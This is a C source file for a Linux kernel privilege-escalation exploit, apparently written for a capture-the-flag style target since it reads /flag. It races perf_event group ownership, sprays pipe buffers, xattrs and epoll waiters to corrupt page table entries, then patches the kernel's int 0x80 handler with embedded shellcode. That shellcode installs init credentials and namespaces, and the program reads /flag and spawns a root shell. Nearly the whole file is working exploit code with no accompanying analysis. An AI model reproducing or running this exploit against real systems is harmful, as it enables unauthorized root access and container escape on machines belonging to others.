#define _GNU_SOURCE   
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <stdio.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <pthread.h>
#include <stdatomic.h>
#include <time.h>
#include <signal.h>

#define MIN 62000
#define MAX 68000
#define MAX_FORK_CNT 50
#define TLB_MMAP_SZ 0x1000 * 512 * 2
#define PAGE_FAULT_COUNT 0x80
#define SIBLINGS_MAX 1024 
#define CPU_A 1
#define CPU_B 0
#define MAX_TRY 4096
#define TRY_PER_ITER 4096
#define PREFIX "security."
#define MAP_SIZE (512ULL * 512ULL * 0x1000ULL)
#define ALIGN_2MB (512ULL * 0x1000ULL)

char shellcode[] = "\x0f\x01\xf8\x65\x4c\x8b\x24\x25\xc0\x0c\x02\x00\x4d\x8b\xb4\x24\x48\x02\x00\x00\x49\x81\xee\x30\xc0\x1e\x00\x4d\x89\xf0\x48\xc7\xc7\x01\x00\x00\x00\x4c\x89\xc0\x48\x05\x50\xde\x1b\x00\x41\x54\x41\x50\xff\xd0\x48\x89\xc3\x41\x58\x41\x5c\x4c\x89\xc0\x48\x05\x00\x69\xa7\x02\x48\x89\xc7\x48\x89\xbb\x38\x08\x00\x00\x49\x89\xbc\x24\x38\x08\x00\x00\x4c\x89\xc0\x48\x05\x40\x6b\xa7\x02\x48\x89\xc7\x49\x89\xbc\x24\xd8\x07\x00\x00\x0f\x01\xf8\x48\xcf";
// change nsproxy to initnsproxy & cred to init cred

int owner_pid;

inline static int _pin_to_cpu(int id)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(id, &set);
    return sched_setaffinity(getpid(), sizeof(set), &set);
}

void busy_wait(long us) {
    struct timespec start, current;
    
    clock_gettime(CLOCK_MONOTONIC, &start);

    do {
        clock_gettime(CLOCK_MONOTONIC, &current);
    } while ((current.tv_sec - start.tv_sec) * 1000000 + (current.tv_nsec - start.tv_nsec) / 1000 < us);
}

int timefds[0x300];
int epfds[0x2c0];
char timerfd_sync_buf[8];
int tfd;

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x10; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x300; i++)
			{
				timefds[i] = dup(fd);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				epfds[i] = epoll_create(0x1);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				for (int j = 0; j < 0x300; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], timerfd_sync_buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], timerfd_sync_buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}

void remove_xattr(char * name, int idx){
    char fname[0x20];
    sprintf(fname, "/tmp/x%d", idx);
    if (setxattr(fname, name, NULL, 0, 0) < 0){
        perror("remove_xattr()");
        exit(0);
    }
}


static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(SYS_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

char * spray_addr[2];
int vuln_pipe[2];
void setup_pagetable_pipe() {
    char * addr;
    char spray_pattern[0x100] = {0xcc, };
    uint64_t current_brk = (uint64_t)sbrk(0);
    uint64_t aligned_addr = (current_brk / ALIGN_2MB) * ALIGN_2MB;
    addr = mmap((void *)(aligned_addr + ALIGN_2MB), MAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    mlock(addr, MAP_SIZE);
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000 * 512)
        addr[i] = 0x41; 
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000)
        addr[i] = 0x41;
    spray_addr[0] = addr;
    if (pipe(vuln_pipe) < 0) {
        perror("setup_pagetable_pipe() - pipe()");
        return;
    }

    write(vuln_pipe[1], spray_pattern, sizeof(spray_pattern)); // page will be allocated near PTEs.
    addr = mmap((void *)aligned_addr + ALIGN_2MB + MAP_SIZE, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    mlock(addr, MAP_SIZE);
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000 * 512)
        addr[i] = 0x41;
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000)
        addr[i] = 0x41;
    spray_addr[1] = addr;
}

void setup_max_fd_limit() {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == -1) {
        perror("setup_max_fd_limit() - getrlimit()");
        exit(EXIT_FAILURE);
    }
    rl.rlim_cur = rl.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rl) == -1) {
        perror("setup_max_fd_limit() - setrlimit()");
        exit(EXIT_FAILURE);
    }
    printf("[+] changed fd limit: %ld\n", rl.rlim_cur);
}

int siblings_fork_pid[MAX_FORK_CNT]; 
int siblings_fork_cnt;
int siblings[SIBLINGS_MAX];
int siblings_cnt;
static atomic_int race_trigger_flag = 0; 
static atomic_int race_notify_flag = 0; 

void spray_xattr_page(int size, int cnt, int idx){
    char value[0x4000] = {0, };
    char fname[0x20];
    sprintf(fname, "/tmp/x%d", idx);
    close(open(fname, O_CREAT | O_RDWR, 0777));
    for(int i = 0; i <= cnt; i++){
        char postfix[0x24] = {0, };
        sprintf(postfix,"x%d_%d", size, i);
        char *name = (char *)calloc(strlen(PREFIX) + strlen(postfix) + 1, 1);
        memset(value, i%0x100, size);
        strcpy(name, PREFIX);
        strcat(name, postfix);
        int ret = setxattr(fname, name, value, size, 0);
        if (ret < 0){
            perror("spray_xattr_page() - setxattr()");
            exit(EXIT_FAILURE);
        }
    }
}

void resize_pipe(int fd, uint64_t sz){
    if(fcntl(fd, F_SETPIPE_SZ, sz) < 0)
        perror("resize_pipe() - pipe()");
}

void race_trigger(int signo) { // signal handler
    atomic_store(&race_trigger_flag, 1);
}

void race_notify(int signo) { // signal handler
    atomic_store(&race_notify_flag, 1);
}

void initialize_race_notifiy(){
    struct sigaction sa;
    sa.sa_handler = race_notify;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGUSR1, &sa, NULL) < 0) {
        perror("initialize_race_notify() - sigaction()");
        exit(EXIT_FAILURE);
    }
}

int race_layout_index = 0; // Index for sequential allocations to create a reliable memory layout during race condition exploitation
void race(int group_leader) { // caller must have ownership of the event group
    int pipefd[2];
    uint64_t event_buf[0x2000];
    char race_sync_buf[8] = {0x41, };
    char buf_pipe_reclaim[0x100]; 
    char xattr_name[0x20];
    struct perf_event_attr pe;
    char * page_fault_memory; 
    int ppid, status;
    if (pipe(pipefd) < 0) {
        perror("race - pipe()");
        exit(EXIT_FAILURE);
    }
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_PAGE_FAULTS;
    pe.disabled = 0;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    pe.inherit = 1;
    pe.pinned = 0; 
    ppid = getppid();
    pid_t child_pid = fork();
    if (child_pid == 0) {  
        _pin_to_cpu(CPU_A);
        sched_yield();

        raise(SIGSTOP); // STOP -> keep parent and child ctx's generation same.
        for (int i=0; i<512+511; i++) {
            ioctl(siblings[i], PERF_EVENT_IOC_RESET, PERF_IOC_FLAG_GROUP);
            ioctl(siblings[i], PERF_EVENT_IOC_ENABLE, 0);
        }
        if (close(siblings[100]) < 0) { 
            perror("close failed");
            exit(EXIT_FAILURE);
        }   

        // when scheduler swaps ctx, it migrates the counter to the next event.
        // so child event's counter value must be refreshed 
        page_fault_memory = (char *)mmap(NULL, 0x1000 * PAGE_FAULT_COUNT, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (int i=0; i < PAGE_FAULT_COUNT; i++) {
            ioctl(group_leader, PERF_EVENT_IOC_ENABLE, 0);
            page_fault_memory[0x1000 * i] = 0x41;
            ioctl(group_leader, PERF_EVENT_IOC_DISABLE, 0);
        }
        uint64_t pte = 0x8000000000000067;

        // this operation ensures that the pipe only uses the first element of the buffer array.
        read(vuln_pipe[0], buf_pipe_reclaim, sizeof(buf_pipe_reclaim)); // release page & init tmp_page
        resize_pipe(vuln_pipe[1], 0); // free
        write(vuln_pipe[1], &pte, 8); // write 8bytes -> using tmp_page again & using newly reclaimed pipe_buffer
        sprintf(xattr_name, "security.x12296_%d", race_layout_index + 1 + 16);
        remove_xattr(xattr_name, 1);
        resize_pipe(vuln_pipe[1], 0x1000 * 220);
        sprintf(xattr_name, "security.x12296_%d", race_layout_index + 16);
        sched_yield();
        write(pipefd[1], race_sync_buf, 1); // sync point A

        remove_xattr(xattr_name, 1);
        for (int _=0; _<32; _++) {
            read(group_leader, event_buf, sizeof(event_buf));
        }
        write(vuln_pipe[1], &pte, sizeof(pte));  
        munmap(page_fault_memory, 0x1000 * 0x80);

        exit(0);
    }
    else if (child_pid > 0) { // parent

        race_layout_index += 2;
        int tmp = perf_event_open(&pe, 0, CPU_A, -1, 0); 
        close(tmp);
        // this code seems useless but, this ensure that the process's ctx is no longer get swapped by scheduler.
        // it's very important because the ownership of the group can be destroyed while child process exits.
        // we have to keep the ownership away from being destroyed.
        usleep(20000);
        kill(child_pid, SIGCONT); // now we pinned the ownership. now child process is allowed to exit.

        read(pipefd[0], race_sync_buf, 1); // sync point A
		int r = MIN + rand() % (MAX - MIN + 1);
        printf("[*] r = %d\n", r);
        struct itimerspec new = {.it_value.tv_nsec = r};
        timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
        close(siblings[100]);

        tmp = perf_event_open(&pe, owner_pid, CPU_A, group_leader, 0);
        if (tmp < 0) {
            perror("Adding failed");
            exit(1);
        }
        siblings[100] = tmp; 
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }
    waitpid(child_pid, &status, 0);

    close(pipefd[0]);
    close(pipefd[1]);
    atomic_store(&race_trigger_flag, 0); // set the flag to 0 so that the child can wait for SIGUSR1 signal from parent.
    kill(ppid, SIGUSR1); // notify parent that the execution of race() is done
}

pid_t setup_events(int group_leader, int cnt, int is_racer) {
    struct perf_event_attr pe;
    char err[8] = {0};
    int pipe_fd[2];

    if (siblings_fork_cnt >= MAX_FORK_CNT) {
        puts("[-] nope");
        exit(EXIT_FAILURE);
    }

    if (pipe(pipe_fd) < 0) {
        perror("setup_events - pipe()");
        exit(EXIT_FAILURE);
    }
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_PAGE_FAULTS;
    pe.disabled = 0;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    pe.inherit = 1; // parent.attr.inherit == child.attr.inherit
    pe.pinned = 0; // child can not be pinned - group leader only
    
    sched_yield();
    pid_t child_pid = fork();
    if(child_pid == 0) { 
        // child & parent must be on the same cpu (validation event->cpu) 
        // This child process must have ownership of the group
        int generation_inc = perf_event_open(&pe, 0, CPU_A, -1, 0); 
        close(generation_inc); // generation++ and ctx will be pinned -> no swap optimization
        
        owner_pid = getpid();
        printf("owner : %d\n", owner_pid);

        for(int i=0; i < cnt; i++){
            int event;
            event = perf_event_open(&pe, 0, CPU_A, group_leader, 0);
            if (event == -1) {
                *err = 0x42; // transfering ownership to child failed. 
                if (write(pipe_fd[1], err, 1) < 0){
                    perror("setup_events - write()");
                    exit(EXIT_FAILURE);
                }
                exit(EXIT_FAILURE);
            }
            else {
                siblings[i + siblings_cnt] = event;
                ioctl(event, PERF_EVENT_IOC_ENABLE, 0);
            }
        }
        siblings_cnt += cnt;
        if (is_racer) {
            struct sigaction sa;
            sa.sa_handler = race_trigger;
            sigemptyset(&sa.sa_mask);
            sa.sa_flags = 0;
            if (sigaction(SIGUSR1, &sa, NULL) < 0) {
                perror("sigaction");
                exit(EXIT_FAILURE);
            }
        }
        *err = 0x41; // OKAY
        if (write(pipe_fd[1], err, 1) < 0){
            perror("setup_events - write()");
            exit(EXIT_FAILURE);
        }
        if (is_racer) {
            _pin_to_cpu(CPU_B);
            sched_yield();
            // child will be running on CPU_A
            spray_xattr_page(0x4008, 4, 1); // 16392
            remove_xattr("security.x16392_0", 1);
            remove_xattr("security.x16392_1", 1);
            remove_xattr("security.x16392_2", 1);
            remove_xattr("security.x16392_3", 1);
            remove_xattr("security.x12296_5", 1);
            remove_xattr("security.x12296_6", 1);
            sched_yield();

            for (int _; _<TRY_PER_ITER; _++) {
                while (!atomic_load(&race_trigger_flag)); // wait for signal
                race(group_leader);
            }
        }
        // wait for kill signal
        sleep(9999999);
        exit(0);
    }
    else if(child_pid < 0) {
        perror("setup_events - fork()");
        exit(EXIT_FAILURE);
    }
    if (read(pipe_fd[0], err, 1) < 0){
        perror("setup_events - read()");
        exit(EXIT_FAILURE);
    }
    if (*err != 0x41) 
        return 0;

    if (kill(child_pid, SIGSTOP) < 0) { // No scheduling
        perror("kill SIGSTOP");
        exit(EXIT_FAILURE);
    }
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    siblings_fork_pid[siblings_fork_cnt++] = child_pid;
    return child_pid;
}

void remove_all_siblings() { // parent process only
    int status;
    for (int i=0; i<siblings_fork_cnt; i++){
        kill(siblings_fork_pid[i], SIGCONT);
        kill(siblings_fork_pid[i], SIGKILL);
        waitpid(siblings_fork_pid[i], &status, 0);
        siblings_fork_pid[i] = 0;
    }

    for (int i=0; i<siblings_cnt; i++){
        if (close(siblings[i]) < 0) {
            perror("remove_all_siblings - close()");
            exit(EXIT_FAILURE);
        }
    }
    siblings_cnt = 0;
    siblings_fork_cnt = 0; 
}

void shell(){
	puts("[+] int80");
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "int 0x80;"
        ".att_syntax;"
    );        

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");
    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");

    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");

    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

	puts("[+] done");
    char flag[0x200];
    memset(flag, 0, 0x200);
    int fd = open("/flag", O_RDONLY);
    read(fd, flag, 0x200);
    write(1, flag, 0x200);
	char * args[2] = {"/bin/sh", 0};
	execve("/bin/sh", args, 0);
    // system("/bin/sh");
}

int lpe(int corrupted_mem_idx0, int corrupted_mem_idx1) {
    uint64_t ptes[512];
    uint64_t pte;
    char dummy[0x20];
    printf("data%d : %lx %lx\n", -1, *(uint64_t *)(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1]), *(uint64_t *)(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1+0x9b0]));
    for (uint64_t i=0; i<0x10000; i++) {
        pte = 0x1000000 * i + 0x1401000; 
        pte |= 0x8000000000000067;
        printf("[+] searching %lx\n", pte);
        if (pte >= 0x80000000c0401067)
            break;
        for (int j=0; j<512; j++)
            ptes[j] = pte;
        read(vuln_pipe[1], dummy, sizeof(dummy)); 
        for (int j=0; j<32; j++) { // repeat overwriting PTE & mprotect -> TLB flush
			mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_READ);
            busy_wait(10000);
            mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
			write(vuln_pipe[1], ptes, sizeof(ptes));  
			read(vuln_pipe[0], ptes, sizeof(ptes));
            
            if (*(uint64_t *)(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1+0x9b0]) == 0xc089f8010fca010fULL) // int80 handler?
            {
                for (int x=0; x<sizeof(shellcode); x++) // patch it
                    spray_addr[corrupted_mem_idx0][corrupted_mem_idx1+0x9b0 + x] = shellcode[x];
                goto found;
            }
            
        }
        mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); // kernel text requires prot exec
    }

   	exit(1);
found:
    puts("[+] int80 entry patched");
    return 0;
}


void exploit() {
    _pin_to_cpu(CPU_B); 
    sched_yield();
    for (int _=0; _<MAX_TRY; _++) {
    retry:
        pid_t pid = fork();
        if (pid == 0) {
            int ret = 0;
            int group_leader;
            struct perf_event_attr pe;
            memset(&pe, 0, sizeof(pe));
            pe.type = PERF_TYPE_SOFTWARE;
            pe.size = sizeof(pe);
            pe.config = PERF_COUNT_SW_PAGE_FAULTS;
            pe.disabled = 1;
            pe.exclude_kernel = 1;
            pe.exclude_hv = 1;
            pe.inherit = 1;
            pe.inherit_stat = 1;
            pe.pinned = 1;
            int pipefd[2];
            if (pipe(pipefd) == -1) {
                perror("pipe");
                exit(EXIT_FAILURE);
            }
            
            pe.read_format = PERF_FORMAT_LOST | PERF_FORMAT_GROUP | PERF_FORMAT_TOTAL_TIME_RUNNING;
            group_leader = perf_event_open(&pe, 0, CPU_A, -1, 0); 
            if (group_leader < 0){
                perror("exploit() - perf_event_open(group_leader)");
                exit(EXIT_FAILURE);
            }
        re: 
            pid = setup_events(group_leader, 512 + 511, 1); // the process that executes race() must have the ownership of the group (= ctx must be swapped).

            if (pid == 0) {
                ret = 1;
                perror("Failed to transfer the ownership to child. retrying"); 
                goto re;
            }
            int ppid = getppid();
            kill(siblings_fork_pid[0], SIGCONT); 
            for (int it=0; it<TRY_PER_ITER; it++) {
                printf("[*] Iter %d\n", it);
                kill(siblings_fork_pid[0], SIGUSR1); // trigger race()
                while (atomic_load(&race_notify_flag) == 0);
                atomic_store(&race_notify_flag, 0);
                kill(ppid, SIGUSR1); // notify parent
                // if we call mprotect in child process, permission bits will be modified
                // so we have to check whether the ptes in "Parent process" are pointing Physical address "0x0"
                raise(SIGSTOP); // sync point B
                // wait for parent process to checkout the ptes.
            }
        gg:
            close(group_leader);
            remove_all_siblings(); 
            exit(ret);
        }
        else if(pid > 0) {
            for (int it=0; it<TRY_PER_ITER; it++) {
                while (atomic_load(&race_notify_flag) == 0);
                atomic_store(&race_notify_flag, 0);
                mprotect(&spray_addr[0][0], MAP_SIZE, PROT_READ);
                mprotect(&spray_addr[0][0], MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC); 
                mprotect(&spray_addr[1][0], MAP_SIZE, PROT_READ);
                mprotect(&spray_addr[1][0], MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
                for (int i=0; i<2; i++) {
                    for (int j=0; j<MAP_SIZE; j+=0x1000) {
                        if (*(uint64_t *)&spray_addr[i][j] == 0xf000ff53f000ff53ULL) { // S
                            printf("[+] Race Successful\n");
                            if (lpe(i, j) == 0) {
                                shell();
                                return;
                            }
                            else
                                continue;
                        }
                    }
                }
                puts("[-] Race Failure");
                kill(pid, SIGCONT); // sync point B
            }
            
            int status;
            waitpid(pid, &status, 0);
            rand();
            if (status == 256)
                goto retry;
        }
        else {
            perror("exploit() -> fork() err");
            exit(EXIT_FAILURE);
        }
    }
    exit(0);
}

int main(void) {
   	setup_pagetable_pipe(); 
    setup_max_fd_limit();
    initialize_race_notifiy();
    tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	do_epoll_enqueue(tfd);
    spray_xattr_page(0x3008, 16 + 2*TRY_PER_ITER, 1);

    alarm(1000);

    exploit();
    sleep(999999); // munmap will trigger kernel panic
}

